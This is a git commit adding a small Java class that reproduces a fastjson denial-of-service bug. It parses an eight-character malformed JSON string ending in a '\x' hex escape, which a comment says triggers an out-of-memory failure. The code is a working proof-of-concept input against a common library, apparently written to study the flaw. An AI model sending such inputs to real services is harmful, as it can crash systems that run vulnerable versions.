9573148c27ba63888eb8fb3c44970f56677fa0af
1348580915@qq.com <18161931993@163.com>
2019-09-10 09:32:27 +0800

    test fastjson case oom

---
+++ src/main/java/com/baymax/dailynotes/dailynotes/fastjson/FastJsonDos.java
@@ -0,0 +1,33 @@
+package com.baymax.dailynotes.dailynotes.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONException;
+
+/**
+ * @author bx
+ * @date 9/10/2019 9:11 AM
+ * https://mp.weixin.qq.com/s/p0vLlguZHQfuAnYsk6dwxw
+ */
+public class FastJsonDos {
+    public static void main(String[] args) {
+
+        //{"a":"\x
+
+        //是由于fastjson处理字符串中\x这种HEX字符表示形式出现的问题。
+
+        String DEATH_STRING = "{\"a\":\"\\x";//输入字符串长度为8
+
+        try {
+
+            Object obj = JSON.parse(DEATH_STRING);
+
+            System.out.println(obj);
+
+        } catch (JSONException ex) {
+
+            System.out.println(ex);
+
+        }
+
+    }
+}
